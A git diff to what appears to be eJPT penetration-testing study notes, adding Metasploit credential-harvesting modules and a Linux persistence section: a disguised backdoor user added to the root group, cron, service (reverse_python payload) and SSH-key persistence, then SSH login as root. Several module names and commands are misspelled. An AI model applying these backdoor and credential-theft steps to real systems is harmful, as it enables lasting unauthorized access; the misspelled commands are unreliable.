@@ -75,6 +75,7 @@ Info about eJPT certification [here](https://security.ine.com/certifications/ejp
 - [Linux Privilege Escalation: Exploiting a vulnerable program](#Linux-Privilege-Escalation:-Exploiting-a-vulnerable-program)
 - [Linux Password Hash (exploit-ProFTPD)](#Linux-Password-Hash-(exploit-ProFTPD))
 - [Linux Privilege Escalation](#Linux-Privilege-Escalation)
+- [Establishing Persistence On Linux](#Establishing-Persistence-On-Linux)
 - [Exploiting Misconfigured Cron Jobs & exploit copy.sh](#Exploiting-Misconfigured-Cron-Jobs-&-exploit-copy.sh)
 - [Exploiting SUID Binaries](#Exploiting-SUID-Binaries)
 - [Exploit HTPP file server rejetto](#Exploit-HTPP-file-server-rejetto)
@@ -2949,7 +2950,7 @@ cat /etc/passwd
 
 > Now after the execution three users will be created you can check them using the following commands.
 
-#### Linux Privilege Escalation: Exploiting a vulnerable program
+#### Linux Privilege Escalation: Exploiting a vulnerable program (chkrootkkit)
 
 ***IT DEPENDS ON THE VERSION OF THE LINUX KERNEL RUNNINGON THE MACHINE AND THE DISTRIBUTION VERSION***
 
@@ -2989,10 +2990,10 @@ cat /etc/shadow (only read my root user)
 > all passsword is store
 
 **determine by $ sign**
-$1 - MD5
-$2 - blowfish
-$5 - SHA-256
-$6 - SHA-512
+- $1 - MD5
+- $2 - blowfish
+- $5 - SHA-256
+- $6 - SHA-512
 
 ```shell
 service postgresql start
@@ -3013,6 +3014,25 @@ sessions -u <id>
 use auxiliary/analyze/crack_linux
 ```
 > this is also use to decode the hash of password
+
+```shell
+use exploit/Linux/gather/hashdump
+set sessions
+run
+```
+> Use `loot` to see the password hash store in file and by simple cat command we see password hash
+
+```shell
+post/multi/gather/ssh_creds
+post/multi/gather/docker_creds
+post/linux/gather/ecryptfs_creds
+post/linux/gather/enum_psk
+post/linux/gather/enum_xchat -> (set XCHAT true)
+post/linux/gather/phpmyadmin_credsteal
+post/linux/gather/pptpd_chap_secrets
+post/linux/manage/sshkey_persistence
+```
+> more usefull module
 
 #### Linux Privilege Escalation
 
@@ -3035,6 +3055,64 @@ chmod +x les.sh
 ```
 > this tell the list of exploits. by this we get the privilage of linux
 
+#### Establishing Persistence On Linux
+
+**Only use in root user**
+> First get the root use by exploit the service running and then sessions to meterpreter and then use chkrootkkit exploit the root and then upgrade to meterpreter to get the root user
+
+> this will not be required if you have a root user access
+
+```shell
+shell
+/bin/bash -i
+useradd -m <user-name> -s /bin/bash
+passwd <user-name> (set the password of that user)
+```
+- This is backdoor
+- set the username is like `ftp`
+> This will only run the target use ssh and remote access protocol
+
+```shell
+gorups root
+```
+> this is use to check the username that is the part of root or not
+
+```shell
+usermod -aG root <user-name>
+```
+> this is add the user in the root group
+
+***Another Way***
+
+```shell
+search platform:linux presistence
+use exploit/Linux/local/cron_presistence
+set session
+run
+```
+
+```shell
+use exploit/Linux/local/srvice_presistence
+set session
+set payload cmd/unix/reverse_python
+set target 4
+run
+```
+
+```shell
+use exploit/Linux/manage/sshkey_presistence
+set createsshfolder true
+set session
+run
+```
+- recommended
+
+> this also give us private key just copy it and exit the msfconsole. Create a new file `nano ssh_key` and add that key.
+
+```shell
+chmod 0400 ssh_key
+ssh -i ssh_key root@<target-IP>
+```
 
 #### Exploiting Misconfigured Cron Jobs & exploit copy.sh
 
